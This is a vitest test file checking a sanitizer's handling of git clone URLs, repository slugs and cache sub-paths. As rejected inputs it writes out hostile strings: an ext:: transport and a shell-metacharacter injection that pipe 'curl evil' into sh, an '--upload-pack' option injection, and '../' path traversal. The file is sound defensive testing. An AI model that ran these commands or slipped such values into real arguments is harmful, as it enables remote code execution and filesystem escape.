import { describe, it, expect } from "vitest";
import { join } from "path";
import { validateGitUrl, isSafeRepoSlug, resolveSubPathUnder } from "../src/sanitize.js";

// ─── Git URL policy ─────────────────────────────────────────────────────────

describe("validateGitUrl", () => {
  it("accepts an https clone url", () => {
    expect(validateGitUrl("https://github.com/acme/plugin.git")).toBe("https://github.com/acme/plugin.git");
  });

  it("rejects an http clone url", () => {
    expect(() => validateGitUrl("http://git.internal.example/acme/plugin.git")).toThrow(/Unsafe git url/);
  });

  it("accepts an ssh clone url", () => {
    expect(validateGitUrl("ssh://git@github.com/acme/plugin.git")).toBe("ssh://git@github.com/acme/plugin.git");
  });

  it("rejects the git ext:: transport, which executes a command", () => {
    expect(() => validateGitUrl("ext::sh -c 'curl evil|sh'")).toThrow(/Unsafe git url/);
  });

  it("rejects a url carrying shell metacharacters", () => {
    expect(() => validateGitUrl('https://github.com/acme/p.git"; curl evil.sh | sh; "')).toThrow(/Unsafe git url/);
  });

  it("rejects local file urls", () => {
    expect(() => validateGitUrl("file:///c:/Windows")).toThrow(/Unsafe git url/);
  });

  it("rejects option-like urls", () => {
    expect(() => validateGitUrl("--upload-pack=/tmp/evil")).toThrow(/Unsafe git url/);
  });

  it("rejects urls without a host", () => {
    expect(() => validateGitUrl("https://")).toThrow(/Unsafe git url/);
  });
});

// ─── Repository slug policy ─────────────────────────────────────────────────

describe("isSafeRepoSlug", () => {
  it("accepts owner/repo", () => {
    expect(isSafeRepoSlug("acme/plugin")).toBe(true);
  });

  it("accepts dots, underscores and hyphens in both segments", () => {
    expect(isSafeRepoSlug("acme-corp/my_plugin.v2")).toBe(true);
  });

  it("rejects slugs with extra path segments", () => {
    expect(isSafeRepoSlug("acme/plugin/extra")).toBe(false);
  });

  it("rejects slugs carrying shell or url syntax", () => {
    expect(isSafeRepoSlug('acme/evil"; curl')).toBe(false);
    expect(isSafeRepoSlug("acme/../../etc")).toBe(false);
  });
});

// ─── Cache directory containment ────────────────────────────────────────────

describe("resolveSubPathUnder", () => {
  const base = join(__dirname, "cache", "abc123");

  it("joins a relative sub path inside the base", () => {
    expect(resolveSubPathUnder(base, "plugins/example-plugin")).toBe(join(base, "plugins", "example-plugin"));
  });

  it("rejects a sub path that escapes the base", () => {
    expect(() => resolveSubPathUnder(base, "../../outside")).toThrow(/escapes the cache directory/);
  });

  it("rejects an absolute sub path", () => {
    expect(() => resolveSubPathUnder(base, join(__dirname, "elsewhere"))).toThrow(/escapes the cache directory/);
  });
});
